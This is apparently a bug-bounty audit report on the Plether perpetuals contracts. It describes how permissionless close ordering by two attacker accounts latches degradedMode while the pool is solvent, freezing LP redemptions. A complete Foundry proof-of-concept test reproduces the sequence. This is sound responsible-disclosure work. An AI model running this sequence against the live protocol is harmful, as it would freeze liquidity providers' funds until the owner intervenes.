# \#98184 [SC-High] Permissionless Close Ordering Latches `degradedMode` With The Pool Solvent, Temporarily Freezing LP Redemptions

**Submitted on Nov 5th 2026 at 19:38:02 UTC by @rubencrxz for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98184
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

A trader can force the engine into `degradedMode` while the pool is fully solvent, using only permissionless actions. They open a net-zero long/short pair across two of their own accounts and close the winning side before the losing side. Closing the winner arms the sticky solvency latch. Closing the loser then restores solvency (`E >= L`, no open positions, free cash), but the latch stays set. While it is set, `settleLpEpoch` reverts, so matured LP redemptions cannot be funded, and no trader can open a position. The only exit is the owner-gated `clearDegradedMode`, so LP funds stay frozen until the owner intervenes manually.

## Vulnerability Details

Three checks interact:

- **Open gate:** requires `E >= L + B`, where `B` is a settlement buffer equal to 0.25% of `L` (`SolvencyAccountingLib.sol`, applied in `CfdEnginePlanLib.sol`).
- **Latch:** arms when `E < L`, evaluated at the end of every close and liquidation (`_enterDegradedModeIfInsolvent`, `CfdEngine.sol`), where `E = pool assets − trader claims` and `L = max(long maxProfit, short maxProfit)`.
- **Clear:** `clearDegradedMode` (`CfdEngine.sol`) only requires `E >= L`, and is `onlyOwner`.

The open gate (`E >= 1.0025·L`) and the latch (`E < L`) are separated only by the 0.25% buffer. Attack sequence (all permissionless):

1. Two attacker accounts open equal and opposite positions in alternating slices (to respect the skew cap) until `L ≈ E`. Net exposure is zero. Two accounts are required because one account cannot hold both sides (`MUST_CLOSE_OPPOSING`).
2. With the pair open, the attacker waits for a basket move of roughly 0.8–0.9% under release parameters (+0.90% in the PoC) and relays the signed oracle update. The attacker does not choose the price; the oracle publishes it.
3. Close the **winning** side first. Profit leaves the pool, `E` drops below `L`, and the latch arms. `clearDegradedMode` now reverts with `CfdEngine__StillInsolvent`, so the owner cannot lift the latch yet.
4. Close the **losing** side. `L` drops to 0 and `E >= L` holds. The clear predicate is now satisfied, but the latch is sticky and stays set.
5. With a matured LP redemption pending, `settleLpEpoch` reverts with `HousePool__DegradedMode` through both the pool and router entry points, and LP withdrawal caps read zero.

**Negative control:** with the same book, closing the losing side first never arms the latch, and the same epoch settles normally. This shows the trigger is the close order, not pool capacity.

This is distinct from the documented limitations. `ACCOUNTING_SPEC.md` (invariant 12) states that a close may *incidentally* complete into degraded mode. It does not state that a third party can deliberately force that state and hold it while the pool is solvent and no positions are open. `SECURITY.md` documents that `L <= E < L + B` blocks LP funding *while the book is open and capacity is consumed*. Here the block persists after every position is closed, with `E` well above `L + B` and free cash available.

It is also not the excluded Arbitrum/Pyth clock-alignment issue: the attack uses no timing advantage and extracts no value from LPs (attacker net PnL ≈ 0, fees only).

## Impact Details

Temporary freezing of funds. While the latch is set, matured LP redemptions cannot be funded, pending LP deposits cannot be activated, and no trader can open a position. The PoC verifies that the freeze holds 1 hour, 24 hours and 7 days after arming, with the mark refreshed each time. After `clearDegradedMode`, the same epoch settles and the LP is paid.

The only function that clears the latch is `clearDegradedMode`, which is `onlyOwner`, so there is no permissionless recovery and the freeze lasts until the owner reacts. Under release parameters, a single freeze costs the attacker roughly 5.3k USDG per 1M of pool in fees and net VPI (an estimate, not asserted in the PoC), plus carry while the pair waits open. The attacker could re-arm the latch after each owner clear, but a continuous freeze would depend on repeated market moves, so the guaranteed impact is a freeze that lasts until the first owner intervention. This matches the in-scope impact *Temporary freezing of funds for at least 1 hour*.

## References

- `packages/perps/src/CfdEngine.sol`: `_enterDegradedModeIfInsolvent`, `clearDegradedMode`
- `packages/perps/src/libraries/SolvencyAccountingLib.sol`, `packages/perps/src/libraries/CfdEnginePlanLib.sol`: open gate and buffer
- `packages/perps/src/HousePool.sol`: `settleLpEpoch`, `HousePool__DegradedMode`
- `packages/perps/ACCOUNTING_SPEC.md` (invariant 12), `packages/perps/SECURITY.md` (degraded-mode limitation)
- PoC: `packages/perps/test/perps/spec/lp/DegradedLatchFreeze.t.sol`

## Proof of Concept

## Proof of Concept

The PoC is a single Foundry test file that runs on commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It deploys the production `OrderRouter`, and the only mocks are the out-of-scope components: Pyth (`MockPyth`, which relays signed prices) and USDG (`MockSettlementToken`). It builds on the repository's own test base, `BasePerpTest`, with the release parameters from `packages/perps/DEPLOYMENT.md`.

1. Place the file at `packages/perps/test/perps/spec/lp/DegradedLatchFreeze.t.sol`.
2. From `packages/perps`, run: `forge test --match-path test/perps/spec/lp/DegradedLatchFreeze.t.sol -vv`

If Foundry's auto-installer fails to resolve `solc 0.8.35`, set `FOUNDRY_SOLC` to the official 0.8.35 release binary.

**Steps reproduced**

1. Setup (owner and LPs, legitimate): deploy and activate the protocol. An LP deposits 1M USDG into the junior tranche and requests a redemption of 10% of its shares; a second LP queues a deposit.
2. Attack (permissionless): two attacker accounts open an equal long/short pair until `L ≈ E`. The mark moves +0.90%, and the update is relayed through `updateMarkPrice`. The attacker closes the short (the winning side).
3. Assertion: `degradedMode == true`, and `clearDegradedMode` reverts `CfdEngine__StillInsolvent`.
4. Attack: the attacker closes the long (the losing side).
5. Assertions: `degradedMode == true` while `E >= L` and both sides' max profit is 0 (no open positions). At +1h, +24h and +7 days, with the mark refreshed each time:
   - `pool.settleLpEpoch` and `router.settleLpEpoch` revert `HousePool__DegradedMode`.
   - The matured redemption stays unfunded.
   - LP withdrawal caps are 0.
   - The pending LP deposit is not activated.
   - A third-party open reverts at commit with `OrderRouter__DegradedMode`.
6. Recovery: the owner calls `clearDegradedMode`, the same epoch settles, and the LP claims USDG.
7. Negative control (`test_LoserFirst_DoesNotArm`): the same book, closed loser-first, never arms the latch, and the epoch settles normally.

**Expected output**

```
[PASS] test_LoserFirst_DoesNotArm()
[PASS] test_PoC_PermissionlessPairFreezesLpRedemptionUntilOwnerClears()
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

**Code**

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {LegacyOrderRouterHarness} from "../../../utils/LegacyOrderRouterHarness.sol";
import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";

contract DegradedLatchFreezeTest is BasePerpTest {

    address internal constant LP = address(0x1F01);
    address internal constant ATTACKER_LONG = address(0xA77A01);
    address internal constant ATTACKER_SHORT = address(0xA77A02);
    address internal constant ATTACKER_KEEPER = address(0xA77A03);
    address internal constant ANY_KEEPER = address(0xBEEF01);
    address internal constant LP2 = address(0x1F02);
    address internal constant OTHER_TRADER = address(0x7AD3);

    uint256 internal constant LP_DEPOSIT = 1_000_000e6;
    uint256 internal constant ENTRY_PRICE = 1e8;
    uint256 internal constant MOVED_PRICE = 1e8 * 10_090 / 10_000;
    uint256 internal constant LP2_DEPOSIT = 10_000e6;

    // Setup: release parameters (DEPLOYMENT.md, "Initial release parameters").
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    // Setup: production OrderRouter instead of the test adapter.
    function _deployLegacyOrderRouter(
        address engine_,
        address engineLens_,
        address pool_,
        address oracle_
    ) internal override returns (LegacyOrderRouterHarness deployedRouter) {
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook = new OrderLifecycleBook(predictedRouter, engine_, address(clearinghouse), pool_);
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        OrderRouter production = new OrderRouter(
            engine_,
            engineLens_,
            pool_,
            oracle_,
            address(keeperSidecar),
            address(policyEvaluator),
            address(orderExecutionSidecar),
            address(lifecycleBook)
        );
        assertEq(address(production), predictedRouter);
        // Cast only satisfies the base test's variable type; no harness is deployed.
        deployedRouter = LegacyOrderRouterHarness(payable(address(production)));
    }

    function setUp() public override {
        // Setup: owner deployment, seeds and trading activation.
        super.setUp();

        // Setup: owner timelocked release configuration.
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.adverseConfidenceMultiplierBps = 2500;
        rc.basketMaxConfidenceRatioBps = 10;
        rc.minOpenNotionalAssets = 1000e6;
        rc.maxPendingOrders = 5;
        routerAdmin.proposeRouterConfig(rc);
        IHousePool.PoolConfig memory pc = _currentPoolConfig();
        pc.maxSeniorExposureAssets = 40_000_000e6;
        pc.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(pc);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        vm.roll(vm.getBlockNumber() + 1);
        routerAdmin.finalizeRouterConfig();
        pool.finalizePoolConfig();

        // Setup: ordinary LP deposit, activated by any keeper.
        settlementToken.mint(LP, LP_DEPOSIT);
        vm.startPrank(LP);
        settlementToken.approve(address(juniorVault), LP_DEPOSIT);
        uint256 depositId = juniorVault.requestDeposit(LP_DEPOSIT, LP, LP);
        vm.stopPrank();
        vm.warp(depositId * 1 hours + 1);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory activation = _mockPythUpdateData(ENTRY_PRICE);
        vm.prank(ANY_KEEPER);
        router.settleLpEpoch(activation);
        vm.prank(LP);
        juniorVault.claimDeposit(depositId, LP_DEPOSIT, LP, LP);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function test_PoC_PermissionlessPairFreezesLpRedemptionUntilOwnerClears() public {
        // Setup: the LP queues a redemption and a second LP queues a deposit.
        uint256 redeemId = _queueLpRedemption();
        uint256 depositId = _queuePendingDeposit();

        // Attack: open the pair, wait for the market move, close the winner first.
        uint256 size = _openPair();
        _relayMark(MOVED_PRICE);
        _order(ATTACKER_SHORT, CfdTypes.Side.SHORT, size, 0, true, MOVED_PRICE);
        uint256 armedAt = vm.getBlockTimestamp();

        // Assertions: latched and not clearable while the loser is open.
        assertTrue(engine.degradedMode(), "degradedMode latched by the winning close");
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        // Attack: close the loser.
        _order(ATTACKER_LONG, CfdTypes.Side.LONG, size, 0, true, MOVED_PRICE);

        // Assertions: latched while solvent, with no open position.
        (uint256 longMax,,,) = engine.sides(uint8(CfdTypes.Side.LONG));
        (uint256 shortMax,,,) = engine.sides(uint8(CfdTypes.Side.SHORT));
        uint256 effectiveAssets = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        assertTrue(engine.degradedMode(), "degradedMode latched");
        assertGe(effectiveAssets, longMax > shortMax ? longMax : shortMax, "solvency predicate of clearDegradedMode holds");
        assertEq(longMax, 0, "no open long liability");
        assertEq(shortMax, 0, "no open short liability");

        // Assertions: frozen at +1 h, +24 h and +7 days without owner action.
        uint256[3] memory delays = [uint256(1 hours), 24 hours, 7 days];
        for (uint256 i; i < 3; ++i) {
            vm.warp(armedAt + delays[i]);
            vm.roll(vm.getBlockNumber() + 1);
            _relayMark(MOVED_PRICE);
            _assertFrozen(redeemId, depositId);
        }

        // Recovery: only the owner can clear; the same redemption is then funded and paid.
        engine.clearDegradedMode();
        vm.prank(ATTACKER_KEEPER);
        IHousePool.LpEpochSettlementResult memory result = pool.settleLpEpoch(0, 0);
        assertGt(result.juniorFundedAssets, 0, "redemption funded after clearDegradedMode");
        uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, LP);
        uint256 balanceBefore = settlementToken.balanceOf(LP);
        vm.prank(LP);
        juniorVault.claimRedeem(redeemId, claimable, LP, LP);
        assertGt(settlementToken.balanceOf(LP) - balanceBefore, 0, "LP receives USDG");
    }

    function test_LoserFirst_DoesNotArm() public {
        // Setup: the LP queues a redemption.
        uint256 redeemId = _queueLpRedemption();

        // Attack: same book and move, but the loser is closed first.
        uint256 size = _openPair();
        _relayMark(MOVED_PRICE);
        _order(ATTACKER_LONG, CfdTypes.Side.LONG, size, 0, true, MOVED_PRICE);
        _order(ATTACKER_SHORT, CfdTypes.Side.SHORT, size, 0, true, MOVED_PRICE);

        // Assertions: no latch and the matured epoch settles.
        assertFalse(engine.degradedMode(), "degradedMode not latched");
        _warpToEpoch(redeemId);
        vm.prank(ATTACKER_KEEPER);
        IHousePool.LpEpochSettlementResult memory result = pool.settleLpEpoch(0, 0);
        assertGt(result.juniorFundedAssets, 0, "matured redemption funded");
    }

    function _queueLpRedemption() internal returns (uint256 redeemId) {
        uint256 lpShares = juniorVault.balanceOf(LP) / 10;
        vm.prank(LP);
        redeemId = juniorVault.requestRedeem(lpShares, LP, LP);
    }

    function _queuePendingDeposit() internal returns (uint256 depositId) {
        _relayMark(ENTRY_PRICE);
        settlementToken.mint(LP2, LP2_DEPOSIT);
        vm.startPrank(LP2);
        settlementToken.approve(address(juniorVault), LP2_DEPOSIT);
        depositId = juniorVault.requestDeposit(LP2_DEPOSIT, LP2, LP2);
        vm.stopPrank();
    }

    function _openPair() internal returns (uint256 size) {
        _relayMark(ENTRY_PRICE);
        uint256 effectiveAssets = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        size = ((effectiveAssets * 10_000 / 10_026) * 1e20 / ENTRY_PRICE / 100e18) * 100e18;
        uint256 notional = size * ENTRY_PRICE / 1e20;
        _fund(ATTACKER_LONG, notional * 200 / 10_000);
        _fund(ATTACKER_SHORT, notional * 200 / 10_000);
        for (uint256 opened; opened < size;) {
            uint256 tranche = size - opened < 300_000e18 ? size - opened : 300_000e18;
            uint256 trancheNotional = tranche * ENTRY_PRICE / 1e20;
            _order(ATTACKER_LONG, CfdTypes.Side.LONG, tranche, trancheNotional * 150 / 10_000, false, ENTRY_PRICE);
            _order(ATTACKER_SHORT, CfdTypes.Side.SHORT, tranche, trancheNotional * 100 / 10_000, false, ENTRY_PRICE);
            opened += tranche;
        }
    }

    function _fund(
        address account,
        uint256 amount
    ) internal {
        settlementToken.mint(account, amount);
        vm.startPrank(account);
        settlementToken.approve(address(clearinghouse), amount);
        clearinghouse.deposit(account, amount);
        vm.stopPrank();
    }

    function _order(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        _relayMark(price);
        OrderV3Types.OrderRequest memory request = _request(side, size, margin, isClose);
        vm.prank(account);
        uint64 id = OrderRouter(payable(address(router))).commitOrder(request);
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(ATTACKER_KEEPER);
        router.executeOrder(id, data);
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = OrderRouter(payable(address(router))).maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: OrderRouter(payable(address(router))).lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _relayMark(
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(ATTACKER_KEEPER);
        router.updateMarkPrice(data);
    }

    function _warpToEpoch(
        uint256 epochId
    ) internal {
        uint256 maturedAt = epochId * 1 hours + 1;
        vm.warp(maturedAt > vm.getBlockTimestamp() ? maturedAt : vm.getBlockTimestamp());
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _assertFrozen(
        uint256 redeemId,
        uint256 depositId
    ) internal {
        assertTrue(engine.degradedMode(), "still latched");
        (, uint256 maturedShares) = juniorVault.getMaturedRedeemHead(pool.currentLpEpoch());
        assertGt(maturedShares, 0, "matured LP redemption pending");
        _assertSettlementReverts();
        assertEq(juniorVault.claimableRedeemRequest(redeemId, LP), 0, "redemption unfunded");
        (,, uint256 maxSeniorWithdraw, uint256 maxJuniorWithdraw) = pool.getPendingTrancheState();
        assertEq(maxSeniorWithdraw, 0, "senior withdrawal cap is zero");
        assertEq(maxJuniorWithdraw, 0, "junior withdrawal cap is zero");
        assertEq(juniorVault.claimableDepositRequest(depositId, LP2), 0, "pending LP deposit not activated");
        assertEq(juniorVault.pendingDepositRequest(depositId, LP2), LP2_DEPOSIT, "LP deposit still pending");
        _assertThirdPartyOpenBlocked();
    }

    function _assertThirdPartyOpenBlocked() internal {
        _fund(OTHER_TRADER, 1000e6);
        OrderV3Types.OrderRequest memory request = _request(CfdTypes.Side.LONG, 10_000e18, 200e6, false);
        vm.prank(OTHER_TRADER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__DegradedMode.selector);
        OrderRouter(payable(address(router))).commitOrder(request);
        (uint256 otherSize,,,,,,) = engine.positions(OTHER_TRADER);
        assertEq(otherSize, 0, "third-party open not executed");
    }

    function _assertSettlementReverts() internal {
        vm.prank(ATTACKER_KEEPER);
        vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
        pool.settleLpEpoch(0, 0);
        bytes[] memory data = _mockPythUpdateData(engine.lastMarkPrice());
        vm.prank(ATTACKER_KEEPER);
        vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
        router.settleLpEpoch(data);
    }

}
```
